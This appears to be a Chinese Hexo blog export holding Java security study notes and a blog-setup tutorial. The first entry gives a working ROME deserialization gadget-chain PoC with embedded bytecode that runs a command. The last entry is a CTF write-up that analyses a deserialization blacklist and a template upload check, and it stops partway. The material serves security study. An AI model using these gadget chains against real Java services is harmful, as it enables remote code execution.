<p>这⾥的key是存⼊HashMap的键，可控 ysoserial选择调⽤ObjectBean.hashCode()⽅法 那么需要准备⼀个HashMap对象，存⼊⼀个键为ObjectBean对象的键值对 跟进ObjectBean.hashCode()⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap.readObject()-&gt;</span><br><span class="line">	ObjectBean.hashCode()-&gt;</span><br><span class="line">		EqualsBean.beanHashCode()-&gt;</span><br><span class="line">    		ObjectBean.tostring()-&gt;</span><br><span class="line">			ToStringBean.tostring()-&gt;</span><br><span class="line">				ToStringBean.tostring()-&gt;</span><br><span class="line">					TemplatesImpl.getOutputProperties()-&gt;</span><br><span class="line">						....</span><br></pre></td></tr></table></figure>

<p>hashmap之前就说过了,跟进ObjectBean的hashcode</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>._equalsBean.beanHashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">beanHashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>._obj.toString().hashCode();</span><br></pre></td></tr></table></figure>

<p>这里equalsBean和刚刚那条链子一样的</p>
<p>只是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">EqualsBean</span><span class="params">(Class beanClass, Object obj)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!beanClass.isInstance(obj)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(obj.getClass() + <span class="string">&quot; is not instance of &quot;</span> + beanClass);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>._beanClass = beanClass;</span><br><span class="line">        <span class="built_in">this</span>._obj = obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以套了2层</p>
<p>写poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">rome</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(</span><br><span class="line">                <span class="string">&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;AA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQAJdHJhbnNmb3JtAQByKExjb20vc3Vu&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;L29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;L3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAbAQCmKExj&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9h&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;cGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNo&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;ZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJj&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;ZUZpbGUBAAdpby5qYXZhDAAHAAgHABwMAB0AHgEABGNhbGMMAB8AIAEADGNvbS9sYWdvdS9pbwEA&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;QGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFu&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;L2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApn&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;ZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAAAuAAIAAQAA&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;AA4qtwABuAACEgO2AARXsQAAAAEACgAAAA4AAwAAAAoABAALAA0ADAALAAAABAABAAwAAQANAA4A&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;AgAJAAAAGQAAAAMAAAABsQAAAAEACgAAAAYAAQAAAA8ACwAAAAQAAQAPAAEADQAQAAIACQAAABkA&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;AAAEAAAAAbEAAAABAAoAAAAGAAEAAAASAAsAAAAEAAEADwABABEAAAACABI=&quot;</span>);</span><br><span class="line">        setFieldValue(impl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        setFieldValue(impl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(impl,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">bean</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ObjectBean</span>(Templates.class,impl);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">Bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ObjectBean.class,bean);</span><br><span class="line">        HashMap map= <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(Bean,<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;rome.txt&quot;</span>));</span><br><span class="line">            outputStream.writeObject(map);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;rome.txt&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>这是我的第一篇文章</title>
    <url>/2023/05/11/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<blockquote>
<p>欢迎来到我的博客</p>
</blockquote>
<p>做的不好,模板也不会用,师傅们觉得不好看,骂轻一点，<br>能用就行o(╥﹏╥)o</p>
<h1 id="我的博客搭建"><a href="#我的博客搭建" class="headerlink" title="我的博客搭建"></a>我的博客搭建</h1><p>我用的是github+hexo,嫌麻烦可以只用github（windows 系统）</p>
<h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><p>需要github账号,安装Hexo需要js环境和git，</p>
<h5 id="git安装"><a href="#git安装" class="headerlink" title="git安装"></a>git安装</h5><ul>
<li><p>官方下载地址: <a href="https://link.zhihu.com/?target=https://git-scm.com/download/win">Git - Downloading Package (git-scm.com)</a></p>
</li>
<li><p>注意事项: 建议选择 64-bit Git for Windows Setup，并且安装时要勾选 <strong>Add to PATH</strong> 选项</p>
</li>
</ul>
<p><img src="https://pic2.zhimg.com/80/v2-c5de3b1f7c5db0fbd4049d9a0c874d4d_720w.webp"></p>
<ul>
<li>安装后验证: 在 cmd 中输入命令 <code>node -v</code>, 查看 Node 版本</li>
</ul>
<h5 id="node-js安装"><a href="#node-js安装" class="headerlink" title="node.js安装"></a>node.js安装</h5><ul>
<li>官方下载地址: <a href="https://link.zhihu.com/?target=https://nodejs.org/en/">Node.js (nodejs.org)</a></li>
<li>注意事项: 使用 Node.js 官方安装程序时，请确保勾选 <strong>Add to PATH</strong> 选项（默认已勾选）</li>
<li>安装后验证: 在 cmd 中输入命令 <code>node -v</code>, 查看 Node 版本</li>
</ul>
<p>如果没有可以手动安装，在环境变量path添加你安装node.js的路径文件名,具体可百度</p>
<h3 id="安装-Hexo"><a href="#安装-Hexo" class="headerlink" title="安装 Hexo"></a>安装 Hexo</h3><h5 id="安装-cnpm"><a href="#安装-cnpm" class="headerlink" title="安装 cnpm"></a>安装 cnpm</h5><p>当您安装 Node.js 之后，便可以在命令行中通过 node install 命令安装您想要的程序了。但本文推荐使用 cnpm 安装 Hexo，所以需要先通过 npm install 安装 cnpm。</p>
<ul>
<li>命令: <code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code><br>说明: -g 表示进行全局安装，–registry&#x3D;&#x3D;<a href="https://link.zhihu.com/?target=https://registry.npm.taobao.org/">https://registry.npm.taobao.org</a> 表示使用淘宝镜像安装 cnpm</li>
<li>安装后验证: 在 cmd 中输入命令 cnpm -v, 可查看 cnpm 版本</li>
</ul>
<p>如果你的网络可以直接访问外网可以不用下载，有些情况下，我们在使用 <code>npm</code> 安装软件包时会遇到速度很慢或者无法安装的问题。这可能是由于 <code>npm</code> 在国内网络环境下访问外部资源受限所导致的。</p>
<p>为了解决这个问题，国内的开发者通常会选择使用 <code>cnpm</code> 替代 <code>npm</code> 进行软件包的安装和管理。<code>cnpm</code> 是淘宝团队提供的一个命令行工具，它可以将 <code>npm</code> 的所有功能完全代理到淘宝的镜像服务器上，从而加快下载速度并且避免了由于网络不稳定等因素导致的下载中断的问题。</p>
<h5 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h5><p>命令: </p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line">cnpm install -g hexo-<span class="keyword">cli</span></span><br></pre></td></tr></table></figure>

<p>说明: -g 表示全局安装，hexo-cli 为所安装的包</p>
<p>也可以用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli </span><br></pre></td></tr></table></figure>

<p><a href="https://zhuanlan.zhihu.com/p/547520780">2022 Hexo 博客搭建和使用教程(Windows) - 知乎 (zhihu.com)</a></p>
<h3 id="配置github"><a href="#配置github" class="headerlink" title="配置github"></a>配置github</h3><h5 id="在-Github-上创建仓库"><a href="#在-Github-上创建仓库" class="headerlink" title="在 Github 上创建仓库"></a>在 Github 上创建仓库</h5><ul>
<li>新建一个名为: <a href="https://link.zhihu.com/?target=http://username.github.io">http://username.github.io</a> 的仓库(username 为您的 Github 用户名)</li>
<li>比如，如果您的 github 用户名是 test，那么您就新建名为 <a href="https://link.zhihu.com/?target=http://test.github.io">http://test.github.io</a> 的仓库（必须是您的用户名，其它名称无效），将来你的网站访问地址就是 <a href="https://link.zhihu.com/?target=https://test.github.io/">https://test.github.io</a> 了。由此可见，每一个 github 账户最多只能创建一个这样可以直接使用域名访问的仓库。</li>
</ul>
<p><img src="https://pic4.zhimg.com/80/v2-c7717b4f019e3c9bcd747627419acddb_720w.webp" alt="img"></p>
<p>注意事项:<br>注册的邮箱一定要验证，否则不会成功;<br>仓库名字必须是：<a href="https://link.zhihu.com/?target=http://username.github.io">http://username.github.io</a>，其中 username 是你的用户名;<br>仓库创建成功不会立即生效，需要过一段时间，大概10-30分钟，或者更久</p>
<h5 id="配置-SSH-免密登录"><a href="#配置-SSH-免密登录" class="headerlink" title="配置 SSH 免密登录"></a>配置 SSH 免密登录</h5><p>为什么要配置这个呢？因为您提交代码肯定要拥有您的 github 权限才可以，但是直接使用用户名和密码太不安全了，所以我们使用 <strong>配置 SSH 免密登录</strong></p>
<p>为什么要配置这个呢？因为您提交代码肯定要拥有您的 github 权限才可以，但是直接使用用户名和密码太不安全了，所以我们使用 ssh key 来解决本地和服务器的连接问题。ssh key 来解决本地和服务器的连接问题。</p>
<p><img src="https://pic1.zhimg.com/80/v2-aec18bbfd3399e194b9172da629d9bbc_720w.webp" alt="img"></p>
<p>3、生成了一个新的 C:\Users\您的用户名\ .ssh文件夹，打开这个文件夹，找到 .ssh\id_rsa.pub 文件，记事本打开并复制里面的内容</p>
<p>4、打开您的 github 主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key，把复制的内容粘贴进去，title 随便填，保存即可，我们的公钥就添加成功了，设置好如下图:</p>
<p><img src="https://pic4.zhimg.com/80/v2-6494b25443fd0a9a261c19c84524b867_720w.webp" alt="img"></p>
<p>5、检测是否设置成功:</p>
<p>输入命令: <code>ssh -T git@github.com</code></p>
<p>第一次要弹个窗口输入 yes就可以</p>
<p>6、此外您还需要如下配置:</p>
<p>命令: <code>git config --global user.name &quot;您的 Github username&quot;</code> &#x2F;&#x2F; 注意是 username, 而非昵称</p>
<p>命令: <code>git config --global user.email &quot;xxx@qq.com&quot;</code> &#x2F;&#x2F; 填写您的 github 注册邮箱</p>
<h3 id="使用-Hexo-搭建博客"><a href="#使用-Hexo-搭建博客" class="headerlink" title="使用 Hexo 搭建博客"></a>使用 Hexo 搭建博客</h3><h5 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h5><p>1、在电脑的某个磁盘或路径新建一个名为 hexo 的文件夹(名字可以随便取)，比如我的是 D:\hexo，由于这个文件夹将来就作为您存放代码的地方，所以最好不要随便放</p>
<p>2、在 D:\hexo 文件夹下右键打开 Git Bash Here（显示更多选项里面），输入命令: <code>hexo init</code> 进行初始化</p>
<p><img src="https://pic1.zhimg.com/80/v2-61f722bf8bed5ae2eb6d5c8e7d55d71c_720w.webp" alt="img"></p>
<p>出现三行才算成功，如果不行就直接在图中https:&#x2F;&#x2F;里面下载源码，再把自己安装node文件夹里面，</p>
<ul>
<li>hexo 会自动下载一些文件到这个目录，包括 node_modules，目录结构如下图:</li>
</ul>
<p><img src="https://pic2.zhimg.com/80/v2-7d8b10608de25181e9ab19e463056f91_720w.webp" alt="img"></p>
<p>3、执行命令: <code>hexo g</code> 会在 public 文件夹下生成相关的 html 文件，这些文件将来需要提交到 Github 上</p>
<p>4、执行命令: <code>hexo s</code> 可以开启本地预览服务，打开浏览器访问 <a href="https://link.zhihu.com/?target=http://localhost:4000/">http://localhost:4000</a> 即可看到博客内容</p>
<h5 id="将博客部署到-Github"><a href="#将博客部署到-Github" class="headerlink" title="将博客部署到 Github"></a><strong>将博客部署到 Github</strong></h5><p>1、在 D:\hexo 目录下安装 hexo-deployer-git 插件</p>
<ul>
<li>命令: <code>npm install hexo-deployer-git --save</code></li>
</ul>
<p>2、编辑 D:\hexo 目录下的 _config.yml 文件，在文件末尾添加如下内容:</p>
<p><img src="https://pic2.zhimg.com/80/v2-4ab624f2b39b37bf524e37f997bea1d9_720w.webp" alt="img"></p>
<p>注意: 其中 repository 中的内容即为 github 个人主页链接地址</p>
<p>3、在 D:\hexo 目录下，输入命令: <code>hexo d</code> 将本地 blog 推送到 github 远程仓库，也可能需要输入 username &amp; pwd</p>
<p>推送成功后，即可通过 <a href="https://link.zhihu.com/?target=https://jzhangcser01.github.io/">https://jzhangcser01.github.io/</a> 访问个人博客了!</p>
<h3 id="更换主题（建议自己找）"><a href="#更换主题（建议自己找）" class="headerlink" title="更换主题（建议自己找）"></a>更换主题（建议自己找）</h3><p>在 D:\hexo 目录下有一个 themes 文件夹，该文件夹下存放着 hexo 所使用的主题</p>
<h5 id="搜索主题"><a href="#搜索主题" class="headerlink" title="搜索主题"></a>搜索主题</h5><ul>
<li>hexo 官方提供了很多主题供我们使用，地址: <a href="https://link.zhihu.com/?target=https://hexo.io/themes/">Themes | Hexo</a>, 选择喜欢的主题并点击即可跳转至 github</li>
<li>笔者使用了 github 上面一个大佬制作的主题，地址: <a href="https://link.zhihu.com/?target=https://github.com/JoeyBling/hexo-theme-yilia-plus">JoeyBling&#x2F;hexo-theme-yilia-plus: 一个简洁优雅的hexo主题 A simple and elegant theme for hexo. (github.com)</a></li>
<li>您可以在 github 中直接搜索 hexo 主题</li>
</ul>
<h5 id="下载主题"><a href="#下载主题" class="headerlink" title="下载主题"></a>下载主题</h5><p>1、在 D:\hexo 目录下右键 Git Bash Here</p>
<p>2、执行命令: <code>git clone 主题http链接 themes/主题名称</code> 将主题下载至 themes 文件夹下</p>
<ul>
<li>可以在该文件夹下查看是否下载成功</li>
</ul>
<h5 id="5-3-使用主题"><a href="#5-3-使用主题" class="headerlink" title="5.3 使用主题"></a><strong>5.3 使用主题</strong></h5><p>打开 D:\hexo 目录下的 config.yml 文件，在里面找到 theme: landscape改为theme: yilia-plus(yilia-plus为我们要使用的主题名)，然后执行 <code>hexo clean</code> 先删除旧的 html 文件，再执行 <code>hexo g</code> 重新生成，再执行 <code>hexo d</code> 推送到远程仓库</p>
<ul>
<li>在浏览器输入相应域名，发现主题已更换</li>
<li>注意: 可能需要等一段时间刷新才更换 please be patient</li>
</ul>
<h5 id="5-4-修改主题内容"><a href="#5-4-修改主题内容" class="headerlink" title="5.4 修改主题内容"></a><strong>5.4 修改主题内容</strong></h5><p>您可以在 themes&#x2F;yilia-plus 文件夹中查看该主题的内容，并可编辑该文件夹中的 _config.yml 文件修改主题样式</p>
<p><img src="https://pic1.zhimg.com/80/v2-48941ca9721f77d183f00880872486f0_720w.webp" alt="img"></p>
<ul>
<li>注意: 记得编辑根目录下的 _config.yml 文件，将信息修改为自己的</li>
</ul>
<p><img src="https://pic4.zhimg.com/80/v2-fd72d0475c648212c2423d35274b06e3_720w.webp" alt="img"></p>
<p>在模板目录下的config.yml 配置文件 搜索url修改成自己的url,其他的自己可以直接看着看，不懂可以问chatgpt，单很多路径和内容它会给错，建议百度</p>
<h3 id="写博客"><a href="#写博客" class="headerlink" title="写博客"></a>写博客</h3><p>1、在 D:\hexo 目录下，通过输入命令: <code>hexo new &quot;文章 title&quot;</code> 会在 &#x2F;source 文件夹下生成对应文章的 .md 文件，然后就可以通过 Typora 打开此文件编写文章并保存了</p>
<p>2、当您写完该篇文章后，依次输入以下命令:</p>
<p><code>hexo clean</code> 删除 public 文件夹，即删除旧的博客文章</p>
<p><code>hexo g</code> 生成 public 文件夹，即生成新的博客文章相关 html 文件</p>
<p><code>hexo d</code> 将博客推送到 github</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>羊城杯java题</title>
    <url>/2023/09/04/%E7%BE%8A%E5%9F%8E%E6%9D%AFjava%E9%A2%98/</url>
    <content><![CDATA[<p>因为我是windows所以就修改了配置文件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">template-loader-path: file:<span class="comment">//D:\\templates\\</span></span><br></pre></td></tr></table></figure>

<p>再把HtmlUploadUtil类里面的修改一下就行了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">realPath</span> <span class="operator">=</span> <span class="string">&quot;D:\\templates\\&quot;</span> + filename;</span><br></pre></td></tr></table></figure>

<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>首先看路由,找利用点</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Welcome to YCB&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/templating&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">templating</span><span class="params">(<span class="meta">@RequestParam</span> String name, Model model)</span> &#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;name&quot;</span>, name);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/getflag&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getflag</span><span class="params">(<span class="meta">@RequestParam</span> String data)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">byte</span>[] decode = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        byteArrayOutputStream.write(decode);</span><br><span class="line">        <span class="type">NewObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NewObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray()));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现在templating路由中,规划了模板文件的,在getflag中触发了反序列化,</p>
<p>先看模板文件index.ftl</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">  &lt;title&gt;Hello&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">你是谁？</span><br><span class="line">我是$&#123;name&#125;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p> 发现这里直接把name值丢过去了,这里能触发xss,但是没什么用,</p>
<p>继续看getflag中反序列化中跟进NewObjectInputStream</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="title function_">NewObjectInputStream</span><span class="params">(InputStream inputStream)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>(inputStream);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// java.io.ObjectInputStream</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">if</span> (BLACKLISTED_CLASSES.contains(desc.getName())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Class not allowed: &quot;</span> + desc.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现过滤了这些类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BLACKLISTED_CLASSES.add(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">BLACKLISTED_CLASSES.add(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">BLACKLISTED_CLASSES.add(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);</span><br><span class="line">BLACKLISTED_CLASSES.add(<span class="string">&quot;java.security.SignedObject&quot;</span>);</span><br><span class="line">BLACKLISTED_CLASSES.add(<span class="string">&quot;com.sun.jndi.ldap.LdapAttribute&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>又是1.8的依赖应禁用2次反序列了,只有看他自己的类了发现</p>
<p>看名字首先想着是可以利用的点看名字发现有个upload在HtmlUploadUtil类中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">uploadfile</span><span class="params">(String filename, String content)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (filename != <span class="literal">null</span> &amp;&amp; !filename.endsWith(<span class="string">&quot;.ftl&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">realPath</span> <span class="operator">=</span> <span class="string">&quot;D:\\templates\\&quot;</span> + filename;</span><br><span class="line">    <span class="keyword">if</span> (realPath.contains(<span class="string">&quot;../&quot;</span>) || realPath.contains(<span class="string">&quot;..\\&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">BufferedWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(realPath));</span><br><span class="line">        writer.write(content);</span><br><span class="line">        writer.close();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;Error uploading file: &quot;</span> + e.getMessage());</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现只运行上传文件后缀为.ftl而且不能保含有.&#x2F;&#x2F;或者..\\的文件在外面的模板文件里面,想起之前的那个路由只返回了index所以要利用的话只有上upload了</p>
<p>跟进哪能能调用这个方法发现在类Htmlmap中get方法中</p>
